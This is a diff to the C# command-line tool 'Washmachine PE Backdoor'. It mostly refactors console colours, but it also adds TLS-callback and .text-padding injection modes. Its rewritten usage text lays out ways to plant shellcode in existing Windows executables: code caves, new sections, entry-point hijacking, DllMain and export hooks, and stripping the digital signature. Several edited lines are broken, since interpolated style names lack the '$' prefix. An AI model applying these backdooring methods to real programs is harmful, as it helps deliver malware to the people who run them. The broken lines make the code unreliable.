-                entropyLines.Add($"[cyan1]Possibly Packed:[/]  {(result.IsPossiblyPacked ? "[red1]Yes[/]" : "[green3_1]No[/]")}");
+                entropyLines.Add($"[{UiColors.Accent}]Overall Entropy:[/]  [{overallEntropyColor}]{result.OverallEntropy:F4}[/]  {BuildEntropyBar(result.OverallEntropy, 15)}");
+                entropyLines.Add($"[{UiColors.Accent}]Possibly Packed:[/]  {(result.IsPossiblyPacked ? "[red1]Yes[/]" : "[green3_1]No[/]")}");
 
                 if (!string.IsNullOrEmpty(result.PackerDetection))
-                    entropyLines.Add($"[cyan1]Packer Detected:[/]  [gold1]{Markup.Escape(result.PackerDetection)}[/]");
+                    entropyLines.Add($"[{UiColors.Accent}]Packer Detected:[/]  [gold1]{Markup.Escape(result.PackerDetection)}[/]");
 
                 AnsiConsole.Write(new Panel(new Markup(string.Join("\n", entropyLines)))
                     .Header("[bold dodgerblue2]Packing / Entropy[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1414,7 +1461,7 @@ public static class Program
                 if (!string.IsNullOrEmpty(feas.RecommendedMethod))
                 {
                     feasLines.Add("");
-                    feasLines.Add($"  [cyan1]Recommended:[/] [green3_1]{Markup.Escape(feas.RecommendedMethod)}[/]");
+                    feasLines.Add($"  [{UiColors.Accent}]Recommended:[/] [green3_1]{Markup.Escape(feas.RecommendedMethod)}[/]");
                 }
 
                 AnsiConsole.Write(new Panel(new Markup(string.Join("\n", feasLines)))
@@ -1439,7 +1486,7 @@ public static class Program
                     double pct = totalVirt > 0 ? (double)s.VirtualSize / totalVirt * 100.0 : 0;
                     int filled = (int)Math.Round(pct / 100.0 * mapBarWidth);
                     filled = Math.Clamp(filled, 1, mapBarWidth);
-                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : "cyan1";
+                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                     string bar = $"[{barColor}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', mapBarWidth - filled)}[/]";
 
                     string sizeStr = s.VirtualSize >= 1048576
@@ -1455,7 +1502,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(new Markup(string.Join("\n", mapLines)))
                     .Header("[bold dodgerblue2]Section Memory Map[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1482,7 +1529,7 @@ public static class Program
                     double pct = totalImage > 0 ? (double)s.VirtualSize / totalImage * 100.0 : 0;
                     int filled = (int)Math.Round(pct / 100.0 * vaBarWidth);
                     filled = Math.Clamp(filled, 1, vaBarWidth);
-                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : "cyan1";
+                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                     string bar = $"[{barColor}]{new string('\u2588', filled)}[/]";
                     string connector = si < result.Sections.Count - 1 ? "\u251c\u2500\u2500" : "\u2514\u2500\u2500";
 
@@ -1499,7 +1546,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(new Markup(string.Join("\n", vaLines)))
                     .Header("[bold dodgerblue2]Virtual Address Space[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1519,7 +1566,7 @@ public static class Program
     {
         int filled = (int)Math.Round(pct / 100.0 * width);
         filled = Math.Clamp(filled, 0, width);
-        return $"[cyan1]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
+        return $"[{UiColors.Accent}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
     }
 
     /// <summary>Build a colored entropy bar (green &lt; 6, gold &lt; 7, red &gt;= 7).</summary>
@@ -1640,6 +1687,8 @@ public static class Program
             "code-cave" or "codecave" or "cave" => InjectionMethod.CodeCave,
             "new-section" or "newsection" or "section" => InjectionMethod.NewSection,
             "section-ext" or "sectionext" or "extend" => InjectionMethod.SectionExtension,
+            "text-pad" or "textpad" or "padding" => InjectionMethod.TextSectionPadding,
+            "tls-callback" or "tls" or "tlscallback" => InjectionMethod.TlsCallback,
             _ => InjectionMethod.CodeCave
         };
 
@@ -1738,7 +1787,7 @@ public static class Program
             if (!jsonOutput)
             {
                 AnsiConsole.WriteLine();
-                AnsiConsole.Write(new Panel("[bold cyan1]Washmachine PE Backdoor[/]")
+                AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]Washmachine PE Backdoor[/]")
                     .Border(BoxBorder.Double)
                     .BorderColor(Color.Cyan1));
                 AnsiConsole.WriteLine();
@@ -1810,39 +1859,39 @@ public static class Program
 
             if (!jsonOutput)
             {
-                AnsiConsole.Write(new Rule("[bold cyan1]Target PE Analysis[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
+                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Target PE Analysis[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                 AnsiConsole.WriteLine();
 
                 var peTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .HideHeaders()
                     .AddColumn("Property")
                     .AddColumn("Value");
 
-                peTable.AddRow("[cyan1]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
-                peTable.AddRow("[cyan1]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
-                peTable.AddRow("[cyan1]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
-                peTable.AddRow("[cyan1]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
-                peTable.AddRow("[cyan1]Entry[/]", $"[mediumpurple1]0x{peInfo.EntryPoint:X}[/]");
-                peTable.AddRow("[cyan1]ImageBase[/]", $"[mediumpurple1]0x{peInfo.ImageBase:X}[/]");
-                peTable.AddRow("[cyan1]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
-                peTable.AddRow("[cyan1].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
-                peTable.AddRow("[cyan1]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
-                peTable.AddRow("[cyan1]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");
+                peTable.AddRow("[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
+                peTable.AddRow("[{UiColors.Accent}]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
+                peTable.AddRow("[{UiColors.Accent}]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
+                peTable.AddRow("[{UiColors.Accent}]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
+                peTable.AddRow("[{UiColors.Accent}]Entry[/]", $"[mediumpurple1]0x{peInfo.EntryPoint:X}[/]");
+                peTable.AddRow("[{UiColors.Accent}]ImageBase[/]", $"[mediumpurple1]0x{peInfo.ImageBase:X}[/]");
+                peTable.AddRow("[{UiColors.Accent}]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
+                peTable.AddRow("[{UiColors.Accent}].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
+                peTable.AddRow("[{UiColors.Accent}]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
+                peTable.AddRow("[{UiColors.Accent}]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");
 
                 AnsiConsole.Write(peTable);
                 AnsiConsole.WriteLine();
 
                 var sectionTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]VirtAddr[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]VirtSize[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
-                    .AddColumn(new TableColumn("[cyan1]Entropy[/]").RightAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned());
 
                 foreach (var sec in analysisResult.Sections)
                 {
@@ -1876,18 +1925,18 @@ public static class Program
                 }
                 teeLogger?.FileOnly("");
 
-                AnsiConsole.Write(new Rule("[bold cyan1]Code Caves[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-                AnsiConsole.MarkupLine($"  [cyan1]Found:[/] [white]{caves.Count}[/]");
+                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Code Caves[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
+                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Found:[/] [white]{caves.Count}[/]");
 
                 if (caves.Count > 0)
                 {
                     var caveTable = new Table()
                         .Border(TableBorder.Rounded)
-                        .BorderColor(Color.Grey42)
-                        .AddColumn("[cyan1]Section[/]")
-                        .AddColumn("[cyan1]Offset[/]")
-                        .AddColumn("[cyan1]RVA[/]")
-                        .AddColumn("[cyan1]Size[/]");
+                        .BorderColor(UiColors.BoxBorderColor)
+                        .AddColumn($"[{UiColors.Accent}]Section[/]")
+                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
+                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
+                        .AddColumn($"[{UiColors.Accent}]Size[/]");
 
                     foreach (var cave in caves.Take(10))
                     {
@@ -1903,29 +1952,29 @@ public static class Program
 
                     if (caves.Count > 10)
                         AnsiConsole.MarkupLine($"  [grey]... and {caves.Count - 10} more[/]");
-                    AnsiConsole.MarkupLine($"  [cyan1]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
+                    AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
                 }
 
                 // Shellcode info
                 AnsiConsole.WriteLine();
-                AnsiConsole.Write(new Rule("[bold cyan1]Shellcode[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
+                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Shellcode[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
 
                 var scTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .HideHeaders()
                     .AddColumn("Property")
                     .AddColumn("Value");
 
-                scTable.AddRow("[cyan1]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
-                scTable.AddRow("[cyan1]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
-                scTable.AddRow("[cyan1]First bytes[/]", $"[mediumpurple1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");
+                scTable.AddRow("[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
+                scTable.AddRow("[{UiColors.Accent}]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
+                scTable.AddRow("[{UiColors.Accent}]First bytes[/]", $"[mediumpurple1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");
 
                 AnsiConsole.Write(scTable);
 
                 // Pre-flight checks
                 AnsiConsole.WriteLine();
-                AnsiConsole.Write(new Rule("[bold cyan1]Pre-flight Checks[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
+                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Pre-flight Checks[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                 PrintCheck(!analysisResult.IsDotNet, "Not a .NET assembly");
                 PrintCheck(!analysisResult.IsPossiblyPacked, $"Not packed (entropy: {analysisResult.OverallEntropy:F2})");
                 PrintCheck(peInfo.EntryPoint != 0, $"Entry point is valid (0x{peInfo.EntryPoint:X})");
@@ -1944,20 +1993,20 @@ public static class Program
 
                 // Injection plan
                 AnsiConsole.WriteLine();
-                AnsiConsole.Write(new Rule("[bold cyan1]Injection Plan[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
+                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Injection Plan[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
 
                 var planTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .HideHeaders()
                     .AddColumn("Property")
                     .AddColumn("Value");
 
-                planTable.AddRow("[cyan1]Method[/]", $"[white]{injectionMethod}[/]");
-                planTable.AddRow("[cyan1]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
-                planTable.AddRow("[cyan1]Invoke[/]", $"[white]{carrierInvoke}[/]");
-                planTable.AddRow("[cyan1]Remove sig[/]", $"[white]{removeSig}[/]");
-                planTable.AddRow("[cyan1]Patch GUI[/]", $"[white]{patchSubsystem}[/]");
+                planTable.AddRow("[{UiColors.Accent}]Method[/]", $"[white]{injectionMethod}[/]");
+                planTable.AddRow("[{UiColors.Accent}]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
+                planTable.AddRow("[{UiColors.Accent}]Invoke[/]", $"[white]{carrierInvoke}[/]");
+                planTable.AddRow("[{UiColors.Accent}]Remove sig[/]", $"[white]{removeSig}[/]");
+                planTable.AddRow("[{UiColors.Accent}]Patch GUI[/]", $"[white]{patchSubsystem}[/]");
 
                 AnsiConsole.Write(planTable);
                 AnsiConsole.WriteLine();
@@ -2005,7 +2054,7 @@ public static class Program
                 ? await service.BackdoorAsync(options)
                 : await AnsiConsole.Status()
                     .Spinner(Spinner.Known.Dots)
-                    .SpinnerStyle(Style.Parse("cyan1"))
+                    .SpinnerStyle(Style.Parse(UiColors.Header))
                     .StartAsync("Injecting payload...", async _ => await service.BackdoorAsync(options));
 
             // ── Log injection result to session ──────────────────────
@@ -2141,60 +2190,57 @@ public static class Program
 
     private static int PrintBackdoorUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli backdoor [darkorange]--pe <file>[/] [darkorange]--shellcode <file>[/] [grey][[options]][/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Required[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-
-        var reqTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        reqTable.AddRow("[darkorange]--pe <file>[/]", "Target PE file to backdoor");
-        reqTable.AddRow("[darkorange]--shellcode, -s <file>[/]", "Shellcode .bin file to inject");
-
-        AnsiConsole.Write(reqTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-
-        var optTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        optTable.AddRow("[darkorange]--output, -o <file>[/]", "Output file (default: <input>.backdoored.exe)");
-        optTable.AddRow("[darkorange]--method, -m <method>[/]", "code-cave | new-section | section-ext");
-        optTable.AddRow("[darkorange]--encryption <enc>[/]", "Reserved. Backdoor expects a ready-to-inject flat .bin payload");
-        optTable.AddRow("[darkorange]--xor-key <byte>[/]", "XOR key as hex (e.g., 0x42) or decimal");
-        optTable.AddRow("[darkorange]--carrier <invoke>[/]", "entry-point only (other carrier modes are not implemented)");
-        optTable.AddRow("[darkorange]--section-name <name>[/]", "Name for new section (default: .extra)");
-        optTable.AddRow("[darkorange]--no-remove-sig[/]", "Don't remove PE digital signature");
-        optTable.AddRow("[darkorange]--no-patch-subsystem[/]", "Don't patch subsystem to GUI");
-        optTable.AddRow("[darkorange]--no-preserve-entry[/]", "Reserved. Disabling OEP resume is not implemented");
-        optTable.AddRow("[darkorange]--no-patch-iat[/]", "Reserved. IAT auto-patching is not currently implemented");
-        optTable.AddRow("[darkorange]--no-patch-exit[/]", "Don't patch exit calls (ExitProcess→ExitThread)");
-        optTable.AddRow("[darkorange]--cave-min-size <n>[/]", "Minimum code cave size in bytes");
-        optTable.AddRow("[darkorange]--dry-run[/]", "Analyze and report without injecting");
-        optTable.AddRow("[darkorange]--verbose[/]", "Show detailed logging");
-        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");
-
-        AnsiConsole.Write(optTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Notes[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.MarkupLine("  [grey]Backdoor injects a ready-to-run flat .bin payload.[/]");
-        AnsiConsole.MarkupLine("  [grey]In-place backdoor encryption and non-entry-point carriers are not supported.[/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s calc.bin[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s shell.bin --dry-run --verbose[/]");
+        UsageFormatter.Print(new CommandUsage(
+            Name: "backdoor",
+            Syntax: $"backdoor [{UiColors.Warning}]--pe <file>[/] [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
+            Description: "Inject shellcode into an existing PE file",
+            Required: new[]
+            {
+                new UsageOption("--pe <file>", "Target PE file to backdoor"),
+                new UsageOption("--shellcode, -s <file>", "Shellcode .bin file to inject"),
+            },
+            Options: new[]
+            {
+                new UsageOption("--output, -o <file>", "Output file", "<input>.backdoored.exe"),
+                new UsageOption("--method, -m <method>", "code-cave | new-section | section-ext | text-pad | tls-callback", "code-cave"),
+                new UsageOption("--section-name <name>", "Name for new section (new-section, tls-callback)", ".extra"),
+                new UsageOption("--carrier <invoke>", "Payload carrier method (see carrier types below)", "entry-point"),
+                new UsageOption("--no-remove-sig", "Keep the PE digital signature"),
+                new UsageOption("--no-patch-subsystem", "Don't patch subsystem to GUI"),
+                new UsageOption("--no-patch-exit", "Don't patch exit calls (ExitProcess → ExitThread)"),
+                new UsageOption("--cave-min-size <n>", "Minimum code cave size in bytes (code-cave only)"),
+                new UsageOption("--dry-run", "Analyze and report without injecting"),
+                new UsageOption("--verbose", "Show detailed logging"),
+                new UsageOption("--json", "Output results as JSON"),
+            },
+            Examples: new[]
+            {
+                new UsageExample("backdoor --pe app.exe -s calc.bin", "Inject using default code-cave method"),
+                new UsageExample("backdoor --pe app.exe -s payload.bin -m new-section", "Add a new PE section for the payload"),
+                new UsageExample("backdoor --pe app.exe -s shell.bin -m text-pad", "Use .text section padding gap"),
+                new UsageExample("backdoor --pe app.exe -s shell.bin -m tls-callback", "Execute via TLS callback (runs before main)"),
+                new UsageExample("backdoor --pe app.exe -s shell.bin -m section-ext", "Extend the last section"),
+                new UsageExample("backdoor --pe app.exe -s shell.bin --dry-run --verbose", "Dry run with verbose analysis"),
+            },
+            Notes: new[]
+            {
+                $"[bold {UiColors.Accent}]Injection Methods:[/]",
+                $"  [{UiColors.Accent}]code-cave[/]     — find null-byte gaps in existing sections (stealthy, size-limited)",
+                $"  [{UiColors.Accent}]new-section[/]   — add a new PE section for the payload (reliable, obvious in section table)",
+                $"  [{UiColors.Accent}]section-ext[/]   — extend the last section (no new header, changes last section size)",
+                $"  [{UiColors.Accent}]text-pad[/]      — write into .text VirtualSize↔RawSize padding gap (no structural changes)",
+                $"  [{UiColors.Accent}]tls-callback[/]  — create a TLS callback that runs the payload before main (x64 only)",
+                "",
+                $"[bold {UiColors.Accent}]Carrier Types (--carrier):[/]",
+                $"  [{UiColors.Accent}]entry-point[/]   — hijack the PE entry point to redirect to payload (default)",
+                $"  [{UiColors.Accent}]tls-callback[/]  — install a TLS callback that executes before main (x64)",
+                $"  [{UiColors.Accent}]dll-main[/]      — hook DllMain for DLL payloads (DLL targets only)",
+                $"  [{UiColors.Accent}]dll-export[/]    — hook a specific DLL export function (DLL targets only)",
+                $"  [{UiColors.Accent}]entry-func[/]    — backdoor a JMP/CALL instruction in the entry function",
+                "",
+                "The backdoor expects a ready-to-run flat .bin payload.",
+                $"Use [{UiColors.Accent}]encode[/] to build shellcode into a loader, or provide raw shellcode directly.",
+            }));
         return 0;
     }
 
@@ -2277,24 +2323,24 @@ public static class Program
         {
             var analysis = await stripper.AnalyzeAsync(peFile);
 
-            AnsiConsole.Write(new Panel($"[bold cyan1]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
+            AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                 .BorderColor(Color.Cyan1)
                 .Border(BoxBorder.Rounded));
             AnsiConsole.WriteLine();
 
-            AnsiConsole.MarkupLine($"  [cyan1]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
-            AnsiConsole.MarkupLine($"  [cyan1]Entry Point:[/]   [mediumpurple1]0x{analysis.EntryPoint:X8}[/]");
-            AnsiConsole.MarkupLine($"  [cyan1]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
+            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
+            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Entry Point:[/]   [mediumpurple1]0x{analysis.EntryPoint:X8}[/]");
+            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
             AnsiConsole.WriteLine();
 
             var table = new Table()
                 .Border(TableBorder.Rounded)
-                .BorderColor(Color.Grey42)
-                .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
-                .AddColumn(new TableColumn("[cyan1]RawAddr[/]").RightAligned())
-                .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
-                .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
-                .AddColumn(new TableColumn("[cyan1]EP[/]").Centered());
+                .BorderColor(UiColors.BoxBorderColor)
+                .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
+                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
+                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
+                .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
+                .AddColumn(new TableColumn($"[{UiColors.Accent}]EP[/]").Centered());
 
             foreach (var sec in analysis.Sections)
             {
@@ -2364,31 +2410,39 @@ public static class Program
 
     private static int PrintStripUsage()
     {
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli strip [darkorange]<pe-file>[/] [grey][[options]][/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-
-        var optTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        optTable.AddRow("[darkorange]-o, --output <file>[/]", "Output .bin path (default: <input>.bin)");
-        optTable.AddRow("[darkorange]-m, --mode <mode>[/]", "ep | section | all-exec | range");
-        optTable.AddRow("[darkorange]--section <name>[/]", "Section name (for 'section' mode)");
-        optTable.AddRow("[darkorange]--range <start:len>[/]", "Raw file range (for 'range' mode, hex ok)");
-        optTable.AddRow("[darkorange]--no-trim[/]", "Don't trim trailing zeros");
-        optTable.AddRow("[darkorange]--analyze[/]", "Show section layout without extracting");
-
-        AnsiConsole.Write(optTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Pipeline[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.MarkupLine("  [dim]1.[/] [cyan1]strip[/] extracts a flat binary from an existing PE.");
-        AnsiConsole.MarkupLine("  [dim]2.[/] Validate that the extracted [white].bin[/] is actually compatible with PE backdooring.");
-        AnsiConsole.MarkupLine("  [dim]3.[/] Use [cyan1]backdoor[/] only with a ready-to-run flat payload.");
+        UsageFormatter.Print(new CommandUsage(
+            Name: "strip",
+            Syntax: $"strip [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
+            Description: "Extract flat binary (.bin) from a PE file",
+            Required: new[]
+            {
+                new UsageOption("<pe-file>", "Path to the PE file to extract from"),
+            },
+            Options: new[]
+            {
+                new UsageOption("-o, --output <file>", "Output .bin path", "<input>.bin"),
+                new UsageOption("-m, --mode <mode>", "ep | section | all-exec | range", "ep"),
+                new UsageOption("--section <name>", "Section name (for 'section' mode)"),
+                new UsageOption("--range <start:len>", "Raw file range (for 'range' mode, hex ok)"),
+                new UsageOption("--no-trim", "Don't trim trailing zeros"),
+                new UsageOption("--analyze", "Show section layout without extracting"),
+            },
+            Examples: new[]
+            {
+                new UsageExample("strip loader.exe", "Extract from entry point to end of .text"),
+                new UsageExample("strip loader.exe -m section --section .text", "Extract entire .text section"),
+                new UsageExample("strip loader.exe -m all-exec", "Extract all executable sections"),
+                new UsageExample("strip loader.exe -m range --range 0x400:0x200", "Extract a specific byte range"),
+                new UsageExample("strip loader.exe --analyze", "Analyze section layout only"),
+            },
+            Notes: new[]
+            {
+                "Extraction modes:",
+                $"  [{UiColors.Accent}]ep[/]        — from entry point to end of containing section (default)",
+                $"  [{UiColors.Accent}]section[/]   — extract a specific section by name",
+                $"  [{UiColors.Accent}]all-exec[/]  — extract all executable sections concatenated",
+                $"  [{UiColors.Accent}]range[/]     — extract a raw file offset range",
+            }));
         return 0;
     }
 
@@ -2415,13 +2469,13 @@ public static class Program
 
                 var table = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
-                    .Title($"[bold cyan1]Templates[/] [grey]({templates.Count})[/]")
-                    .AddColumn(new TableColumn("[cyan1]ID[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Display[/]").LeftAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .Title($"[bold {UiColors.Header}]Templates[/] [{UiColors.Muted}]({templates.Count})[/]")
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]ID[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Display[/]").LeftAligned());
 
                 foreach (var t in templates)
-                    table.AddRow($"[cyan1]{Markup.Escape(t.Id)}[/]", Markup.Escape(t.Display));
+                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape(t.Id)}[/]", $"[{UiColors.Value}]{Markup.Escape(t.Display)}[/]");
 
                 AnsiConsole.Write(table);
                 break;
@@ -2438,37 +2492,37 @@ public static class Program
                 }
                 catch (Exception ex)
                 {
-                    AnsiConsole.MarkupLine("[gold1]⚠ Bin2Shell is not available.[/]");
-                    AnsiConsole.MarkupLine($"[grey]  {Markup.Escape(ex.Message)}[/]");
+                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]⚠ Bin2Shell is not available.[/]");
+                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]  {Markup.Escape(ex.Message)}[/]");
                     AnsiConsole.WriteLine();
-                    AnsiConsole.MarkupLine("[dim]Run [cyan1]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
+                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run [{UiColors.Accent}]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
                     break;
                 }
 
                 var encTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
-                    .Title($"[bold cyan1]Encoders[/] [grey]({catalog.Encoders.Count})[/]")
-                    .AddColumn("[cyan1]Index[/]")
-                    .AddColumn("[cyan1]Name[/]")
-                    .AddColumn("[cyan1]Description[/]");
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .Title($"[bold {UiColors.Header}]Encoders[/] [{UiColors.Muted}]({catalog.Encoders.Count})[/]")
+                    .AddColumn($"[{UiColors.Accent}]Index[/]")
+                    .AddColumn($"[{UiColors.Accent}]Name[/]")
+                    .AddColumn($"[{UiColors.Accent}]Description[/]");
 
                 foreach (var e in catalog.Encoders)
